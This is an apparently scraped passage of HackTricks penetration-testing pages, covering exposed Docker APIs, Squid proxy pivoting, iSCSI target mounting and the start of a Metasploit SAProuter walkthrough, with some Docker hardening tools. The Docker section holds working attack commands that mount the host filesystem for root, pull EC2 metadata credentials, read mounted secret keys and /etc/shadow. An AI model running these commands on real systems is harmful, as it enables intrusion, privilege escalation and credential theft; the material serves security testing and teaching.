894b81a4b802e4eb2a91d1ce216b8817763c29fb\nrunc:\nVersion:\n1.0\n.0-rc8\nGitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f\ndocker-init:\nVersion:\n0.18\n.0\nGitCommit:        fec3683\nIf you can\ncontact the remote docker API with the\ndocker\ncommand\nyou can\nexecute\nany of the\ndocker\ncommands previously\ncommented\nto interest with the service.\nYou can\nexport DOCKER_HOST=\"tcp://localhost:2375\"\nand\navoid\nusing the\n-H\nparameter with the docker command\nFast privilege escalation\ndocker\nrun\n-it\n-v\n/:/host/ ubuntu:latest\nchroot\n/host/\nbash\nCurl\nSometimes you‚Äôll see\n2376\nup for the\nTLS\nendpoint. I haven‚Äôt been able to connect to it with the docker client but you can with curl no problem to hit the docker API.\n#List containers\ncurl\n‚Äìinsecure https://tlsopen.docker.socket:2376/containers/json\n|\njq\n#List processes inside a container\ncurl\n‚Äìinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top\n|\njq\n#Set up and exec job to hit the metadata URL\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec\n-d\n'{ \"AttachStdin\": false, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"/bin/sh\", \"-c\", \"wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\"]}'\n#Get the output\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start\n-d\n'{}'\n# list secrets (no secrets/swarm not set up)\ncurl\n-s\n‚Äìinsecure https://tlsopen.docker.socket:2376/secrets\n|\njq\n#Check what is mounted\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec\n-d\n'{ \"AttachStdin\": false, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"/bin/sh\", \"-c\", \"mount\"]}'\n#Get the output by starting the exec\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start\n-d\n'{}'\n#Cat the mounted secret\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec\n-d\n'{ \"AttachStdin\": false, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"/bin/sh\", \"-c\", \"cat /run/secrets/registry-key.key\"]}'\n#List service (If you have secrets, it‚Äôs also worth checking out services in case they are adding secrets via environment variables)\ncurl\n-s\n‚Äìinsecure https://tls-opendocker.socket:2376/services\n|\njq\n#Creating a container that has mounted the host file system and read /etc/shadow\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket2376/containers/create?name\n=\ntest\n-d\n'{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}'\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name\n=\ntest\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec\n-d\n'{ \"AttachStdin\": false, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"/bin/sh\", \"-c\", \"cat /mnt/etc/shadow\"]}'\ncurl\n‚Äìinsecure\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start\n-d\n'{}'\n#Stop the container\ncurl\n‚Äìinsecure\n-vv\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop\n#Delete stopped containers\ncurl\n‚Äìinsecure\n-vv\n-X\nPOST\n-H\n\"Content-Type: application/json\"\nhttps://tls-opendocker.socket:2376/containers/prune\nIf you want more information about this, more information is available where I copied the commands from:\nhttps://securityboulevard.com/2019/02/abusing-docker-api-socket/\n‚Äã\nAutomatic\nmsf\n>\nuse exploit/linux/http/docker_daemon_tcp\nnmap\n-sV\n--script\n\"docker-*\"\n-p\n<\nPORT\n>\n<\nIP\n>\nCompromising\nIn the following page you can find ways to\nescape from a docker container\n:\nDocker Security\nAbusing this it's possible to escape form a container, you could run a weak container in the remote machine, escape from it, and compromise the machine:\ndocker\n-H\n<\nhost\n>\n:2375 run\n--rm\n-it\n--privileged\n--net\n=\nhost\n-v\n/:/mnt alpine\ncat\n/mnt/etc/shadow\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py\n‚Äã\nPrivilege Escalation\nIf you are inside a host that is using docker, you may\nread this information to try to elevate privileges\n.\nDiscovering secrets in running Docker containers\ndocker\nps\n[\n|\ngrep\n<\nkubernetes_service_name\n>\n]\ndocker\ninspect\n<\ndocker_id\n>\nCheck\nenv\n(environment variable section) for secrets and you may find:\nPasswords.\nIp‚Äôs.\nPorts.\nPaths.\nOthers‚Ä¶ .\nIf you want to extract a file:\ndocker\ncp\n<\ndocket_id\n>\n:/etc/\n<\nsecret_0\n1\n>\n<\nsecret_0\n1\n>\nSecuring your Docker\nSecuring Docker installation and usage\nYou can use the tool\nhttps://github.com/docker/docker-bench-security\nto inspect your current docker installation.\n./docker-bench-security.sh\nYou can use the tool\nhttps://github.com/kost/dockscan\nto inspect your current docker installation.\ndockscan -v unix:///var/run/docker.sock\nYou can use the tool\nhttps://github.com/genuinetools/amicontained\nthe privileges a container will have when run with different security options. This is useful to know the implications of using some security options to run a container:\ndocker run --rm -it r.j3ss.co/amicontained\ndocker run --rm -it --pid host r.j3ss.co/amicontained\ndocker run --rm -it --security-opt \"apparmor=unconfined\" r.j3ss.co/amicontained\nSecuring Docker Images\nYou can use a docker image of\nhttps://github.com/quay/clair\nto make it scan your other docker images and find vulnerabilities.\ndocker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config=\"/config/config.yaml\"\nclair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image\nSecuring Dockerfiles\nYou can use the tool\nhttps://github.com/buddy-works/dockerfile-linter\nto\ninspect your Dockerfile\nand find all kinds of misconfigurations. Each misconfiguration will be given an ID, you can find here\nhttps://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md\nhow to fix each of them.\ndockerfilelinter -f Dockerfile\nYou can use the tool\nhttps://github.com/replicatedhq/dockerfilelint\nto\ninspect your Dockerfile\nand find all kinds of misconfigurations.\ndockerfilelint Dockerfile\nYou can use the tool\nhttps://github.com/RedCoolBeans/dockerlint\nto\ninspect your Dockerfile\nand find all kinds of misconfigurations.\ndockerlint Dockerfile\nYou can use the tool\nhttps://github.com/hadolint/hadolint\nto\ninspect your Dockerfile\nand find all kinds of misconfigurations.\nhadolint Dockerfile\nLogging Suspicious activity\nYou can use the tool\nhttps://github.com/falcosecurity/falco\nto detect\nsuspicious behaviour in running containers\n.\nNote in the following chunk how\nFalco compiles a kernel module and insert it\n. After that, it loads the rules and\nstart logging suspicious activities\n. In this case it has detected 2 privileged containers started, 1 of them with a sensitive mount, and after some seconds it detected how a shell was opened inside one of the containers.\ndocker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco\n* Setting up /usr/src links from host\n* Unloading falco-probe, if present\n* Running dkms install for falco\n‚Äã\nKernel preparation unnecessary for this kernel.  Skipping...\n‚Äã\nBuilding module:\ncleaning build area......\nmake -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............\ncleaning build area......\n‚Äã\nDKMS: build completed.\n‚Äã\nfalco-probe.ko:\nRunning module version sanity check.\nmodinfo: ERROR: missing module or filename.\n- Original module\n- No original module exists within this kernel\n- Installation\n- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/\nmkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system\ncp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory\n‚Äã\ndepmod...\n‚Äã\nDKMS: install completed.\n* Trying to load a dkms falco-probe, if present\nfalco-probe found and loaded in dkms\n2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml\n2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:\n2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:\n2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:\n2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765\n2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)\n2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)\n2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)\n2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)\nMonitoring Docker\nYou can use auditd to monitor docker.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n2301,2381 - Pentesting Compaq/HP Insight Manager\nNext\n- Network Services Pentesting\n3128 - Pentesting Squid\nLast modified\n6mo ago"
    },
    {
        "title": "3128 - Pentesting Squid",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid",
        "text": "3128 - Pentesting Squid\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nSquid\nis a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic. Although primarily used for HTTP and FTP, Squid includes limited support for several other protocols including Internet Gopher, SSL, TLS and HTTPS. Squid does not support the SOCKS protocol, unlike Privoxy, with which Squid can be used in order to provide SOCKS support. (From\nhere\n).\nDefault port:\n3128\nPORT     STATE  SERVICE      VERSION\n3128/tcp open   http-proxy   Squid http proxy 4.11\nEnumeration\nWeb Proxy\nYou can try to set this discovered service as proxy in your browser. However, if it's configured with HTTP authentication you will be prompted for usernames and password.\n# Try to proxify curl\ncurl\n--proxy\nhttp://10.10.11.131:3128 http://10.10.11.131\nNmap proxified\nYou can also try to abuse the proxy to\nscan internal ports proxifying nmap\n.\nConfigure proxychains to use the squid proxy adding he following line at the end of the proxichains.conf file:\nhttp 10.10.10.10 3128\nThen run nmap with proxychains to\nscan the host from local\n:\nproxychains nmap -sT -n -p- localhost\nSPOSE Scanner\nAlternatively, the Squid Pivoting Open Port Scanner (\nspose.py\n) can be used.\npython spose.py\n--proxy\nhttp://10.10.11.131:3128\n--target\n10.10\n.11.131\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n2375, 2376 Pentesting Docker\nNext\n- Network Services Pentesting\n3260 - Pentesting ISCSI\nLast modified\n4mo ago"
    },
    {
        "title": "3260 - Pentesting ISCSI",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi",
        "text": "3260 - Pentesting ISCSI\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIn computing,\niSCSI\nis an acronym for\nInternet Small Computer Systems Interface\n, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. It provides block-level access to storage devices by carrying SCSI commands over a TCP/IP network. iSCSI is used to facilitate data transfers over intranets and to manage storage over long distances. It can be used to transmit data over local area networks (LANs), wide area networks (WANs), or the Internet and can enable location-independent data storage and retrieval.\nThe protocol allows clients (called initiators) to send SCSI commands (CDBs) to storage devices (targets) on remote servers. It is a storage area network (SAN) protocol, allowing organizations to consolidate storage into storage arrays while providing clients (such as database and web servers) with the illusion of locally attached SCSI disks. It mainly competes with Fibre Channel, but unlike traditional Fibre Channel which usually requires dedicated cabling, iSCSI can be run over long distances using existing network infrastructure.\nDefault port:\n3260\nPORT     STATE SERVICE VERSION\n3260/tcp open  iscsi?\nEnumeration\nnmap -sV --script=iscsi-info -p 3260 192.168.xx.xx\nThis script will indicate if authentication is required.\n‚Äã\nBrute force\n‚Äã\n‚Äã\nMount ISCSI on Linux\n‚Äã\nNote:\nYou may find that when your targets are discovered, they are listed under a different IP address. This tends to happen if the iSCSI service is exposed via NAT or a virtual IP. In cases like these,\niscsiadmin\nwill fail to connect. This requires two tweaks: one to the directory name of the node automatically created by your discovery activities, and one to the\ndefault\nfile contained within this directory.\nFor example, you are trying to connect to an iSCSI target on 123.123.123.123 at port 3260. The server exposing the iSCSI target is actually at 192.168.1.2 but exposed via NAT. isciadm will register the\ninternal\naddress rather than the\npublic\naddress:\niscsiadm -m discovery -t sendtargets -p 123.123.123.123:3260\n192.168.1.2:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\n[...]\nThis command will create a directory in your filesystem like this:\n/etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/192.168.1.2\\,3260\\,1/\nWithin the directory, there is a default file with all the settings necessary to connect to the target.\n1.\nRename\n/etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/192.168.1.2\\,3260\\,1/\nto\n/etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/123.123.123.123\\,3260\\,1/\n2.\nWithin\n/etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/123.123.123.123\\,3260\\,1/default\n, change the\nnode.conn[0].address\nsetting to point to 123.123.123.123 instead of 192.168.1.2. This could be done with a command such as\nsed -i 's/192.168.1.2/123.123.123.123/g' /etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/123.123.123.123\\,3260\\,1/default\nYou may now mount the target as per the instructions in the link.\n‚Äã\nMount ISCSI on Windows\n‚Äã\nManual enumeration\nsudo\napt-get\ninstall\nopen-iscsi\nFirst of all you need to\ndiscover the targets\nname behind the IP:\niscsiadm -m discovery -t sendtargets -p 123.123.123.123:3260\n123.123.123.123:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\n[2a01:211:7b7:1223:211:32ff:fea9:fab9]:3260,1 iqn.2000-01.com.synology:asd3.Target-1.d0280fd382\n[fe80::211:3232:fab9:1223]:3260,1 iqn.2000-01.com.synology:Oassdx.Target-1.d0280fd382\nNote that it will show the I\nP and port of the interfaces\nwhere you can\nreach\nthose\ntargets\n. It can even\nshow internal IPs or different IPs\nfrom the one you used.\nThen you\ncatch the 2nd part of the printed string of each line\n(\niqn.1992-05.com.emc:fl1001433000190000-3-vnxe\nfrom the first line) and\ntry to login\n:\niscsiadm\n-m\nnode\n--targetname\n=\n\"iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\"\n-p\n123.123\n.123.123:3260\n--login\nLogging\nin\nto\n[\niface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal:\n123.123\n.123.123,3260\n]\n(\nmultiple\n)\nLogin to\n[\niface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal:\n123.123\n.123.123,3260\n]\nsuccessful.\nThen, you can\nlogout\nusing\n‚Äìlogout\niscsiadm\n-m\nnode\n--targetname\n=\n\"iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\"\n-p\n123.123\n.123.123:3260\n--logout\nLogging out of session\n[\nsid:\n6\n, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal:\n123.123\n.123.123,3260\n]\nLogout of\n[\nsid:\n6\n, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal:\n123.123\n.123.123,3260\n]\nsuccessful.\nWe can find\nmore information\nabout it by just using\nwithout\nany\n--login\n/\n--logout\nparameter\niscsiadm\n-m\nnode\n--targetname\n=\n\"iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\"\n-p\n123.123\n.123.123:3260\n# BEGIN RECORD 2.0-873\nnode.name\n=\niqn.1992-05.com.emc:fl1001433000190000-3-vnxe\nnode.tpgt\n=\n1\nnode.startup\n=\nmanual\nnode.leading_login\n=\nNo\niface.hwaddress\n=\n<\nempty\n>\niface.ipaddress\n=\n<\nempty\n>\niface.iscsi_ifacename\n=\ndefault\niface.net_ifacename\n=\n<\nempty\n>\niface.transport_name\n=\ntcp\niface.initiatorname\n=\n<\nempty\n>\niface.bootproto\n=\n<\nempty\n>\niface.subnet_mask\n=\n<\nempty\n>\niface.gateway\n=\n<\nempty\n>\niface.ipv6_autocfg\n=\n<\nempty\n>\niface.linklocal_autocfg\n=\n<\nempty\n>\niface.router_autocfg\n=\n<\nempty\n>\niface.ipv6_linklocal\n=\n<\nempty\n>\niface.ipv6_router\n=\n<\nempty\n>\niface.state\n=\n<\nempty\n>\niface.vlan_id\n=\n0\niface.vlan_priority\n=\n0\niface.vlan_state\n=\n<\nempty\n>\niface.iface_num\n=\n0\niface.mtu\n=\n0\niface.port\n=\n0\nnode.discovery_address\n=\n192.168\n.xx.xx\nnode.discovery_port\n=\n3260\nnode.discovery_type\n=\nsend_targets\nnode.session.initial_cmdsn\n=\n0\nnode.session.initial_login_retry_max\n=\n8\nnode.session.xmit_thread_priority\n=\n-20\nnode.session.cmds_max\n=\n128\nnode.session.queue_depth\n=\n32\nnode.session.nr_sessions\n=\n1\nnode.session.auth.authmethod\n=\nNone\nnode.session.auth.username\n=\n<\nempty\n>\nnode.session.auth.password\n=\n<\nempty\n>\nnode.session.auth.username_in\n=\n<\nempty\n>\nnode.session.auth.password_in\n=\n<\nempty\n>\nnode.session.timeo.replacement_timeout\n=\n120\nnode.session.err_timeo.abort_timeout\n=\n15\nnode.session.err_timeo.lu_reset_timeout\n=\n30\nnode.session.err_timeo.tgt_reset_timeout\n=\n30\nnode.session.err_timeo.host_reset_timeout\n=\n60\nnode.session.iscsi.FastAbort\n=\nYes\nnode.session.iscsi.InitialR2T\n=\nNo\nnode.session.iscsi.ImmediateData\n=\nYes\nnode.session.iscsi.FirstBurstLength\n=\n262144\nnode.session.iscsi.MaxBurstLength\n=\n16776192\nnode.session.iscsi.DefaultTime2Retain\n=\n0\nnode.session.iscsi.DefaultTime2Wait\n=\n2\nnode.session.iscsi.MaxConnections\n=\n1\nnode.session.iscsi.MaxOutstandingR2T\n=\n1\nnode.session.iscsi.ERL\n=\n0\nnode.conn\n[\n0\n]\n.address\n=\n192.168\n.xx.xx\nnode.conn\n[\n0\n]\n.port\n=\n3260\nnode.conn\n[\n0\n]\n.startup\n=\nmanual\nnode.conn\n[\n0\n]\n.tcp.window_size\n=\n524288\nnode.conn\n[\n0\n]\n.tcp.type_of_service\n=\n0\nnode.conn\n[\n0\n]\n.timeo.logout_timeout\n=\n15\nnode.conn\n[\n0\n]\n.timeo.login_timeout\n=\n15\nnode.conn\n[\n0\n]\n.timeo.auth_timeout\n=\n45\nnode.conn\n[\n0\n]\n.timeo.noop_out_interval\n=\n5\nnode.conn\n[\n0\n]\n.timeo.noop_out_timeout\n=\n5\nnode.conn\n[\n0\n]\n.iscsi.MaxXmitDataSegmentLength\n=\n0\nnode.conn\n[\n0\n]\n.iscsi.MaxRecvDataSegmentLength\n=\n262144\nnode.conn\n[\n0\n]\n.iscsi.HeaderDigest\n=\nNone\nnode.conn\n[\n0\n]\n.iscsi.DataDigest\n=\nNone\nnode.conn\n[\n0\n]\n.iscsi.IFMarker\n=\nNo\nnode.conn\n[\n0\n]\n.iscsi.OFMarker\n=\nNo\n# END RECORD\nThere is a script to automate basic subnet enumeration process available at\niscsiadm\n‚Äã\nShodan\nport:3260 AuthMethod\nReferences\nInfrastructure PenTest Series : Part 2 - Vulnerability Analysis ‚Äî tech.bitvijays.com\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3128 - Pentesting Squid\nNext\n- Network Services Pentesting\n3299 - Pentesting SAPRouter\nLast modified\n6mo ago"
    },
    {
        "title": "3299 - Pentesting SAPRouter",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3299-pentesting-saprouter",
        "text": "3299 - Pentesting SAPRouter\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCopy of:\nhttps://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/\n‚Äã\nPORT     STATE SERVICE    VERSION\n3299/tcp open  saprouter?\nPiercing SAProuter with Metasploit\nSaprouter is basically a reverse proxy for SAP systems, typically sitting between the Internet and internal SAP systems. Its main purpose is to allow controlled access from hosts on the Internet to the internal SAP systems, since it allows for a finer grained control of SAP protocols than a typical firewall.\nThis means that saprouter usualy ends up being exposed to the Internet, by allowing the inbound TCP port 3299 to the saprouter host on the organization's firewalls. And from the saprouter, at least it should be possible to reach an internal SAP server. This makes it a very interesting target, since it can provide a way into the ‚Äúhigh value‚Äù network.\nThe following figure shows a basic network setup, which we will use for the examples:\nFirst we'll start by performing a SAP service scan of the exposed IP address, using the\nsap_service_discovery\nmodule, in this case, 1.2.3.101.\nmsf> use auxiliary/scanner/sap/sap_service_discovery\nmsf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101\nRHOSTS => 1.2.3.101\nmsf auxiliary(sap_service_discovery) > run\n‚Äã\n[*] [SAP] Beginning service Discovery '1.2.3.101'\n‚Äã\n[+] 1.2.3.101:3299      - SAP Router OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nThe scan shows us that the host is running a SAP router on the expected port TCP 3299. We can now dig deeper, and attempt to obtain some information from the saprouter. If it has been misconfigured, and often they are, it may be possible to obtain internal information, such as connections established through the saprouter to internal hosts. For this purpose we use the\nsap_router_info_request\nmodule:\nmsf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request\nmsf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101\nRHOSTS => 1.2.3.101\nmsf auxiliary(sap_router_info_request) > run\n‚Äã\n[+] 1.2.3.101:3299 - Connected to saprouter\n[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request\n[+] 1.2.3.101:3299 - Got INFO response\n[+] Working directory   : /opt/sap\n[+] Routtab             : ./saprouttab\n‚Äã\n[SAP] SAProuter Connection Table for 1.2.3.101\n===================================================\n‚Äã\nSource        Destination   Service\n------        -----------   -------\n1.2.3.12      192.168.1.18  3200\n‚Äã\n‚Äã\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nSo, from the output we see that someone on the Internet (1.2.3.12) is connected to an internal host (192.168.1.18) on port 3200. Port 3200 is a common SAP port for the DIAG protocol (that's where the SAP GUI application connects to SAP servers). We also obtain information about the internal IP addressing scheme, they're quite surely using at least the 192.168.1.0/24 network, or some subnet in that network.\nEnumerating internal hosts and services\nWith this information, we are now able to start scanning the internal network. Since saprouter works like a proxy, we will attempt to connect to it and request connections to internal hosts and ports, and see the replies from saprouter. This may gives more insight into the internal hosts, services and ACLs, depending on the configuration of the saprouter. We'll be using the\nsap_router_portscanner\nmodule for this purpose.\nThe module connects to the saprouter and requests connections to other hosts (defined in the TARGETS option) in specific TCP ports. It then analyses the replies, and understands whether the requested connection is possible or not. This module provides a few options that can used:\nBasic options:\nName         Current Setting  Required  Description\n----         ---------------  --------  -----------\nCONCURRENCY  10               yes       The number of concurrent ports to check per host\nINSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)\nMODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)\nPORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)\nRESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)\nRHOST                         yes       SAPRouter address\nRPORT        3299             yes       SAPRouter TCP port\nTARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.\nAt the very least you'll have to set the saprouter's IP address, in the example case, 1.2.3.101. Then, set TARGETS to the internal network addresses you'd like to scan, and 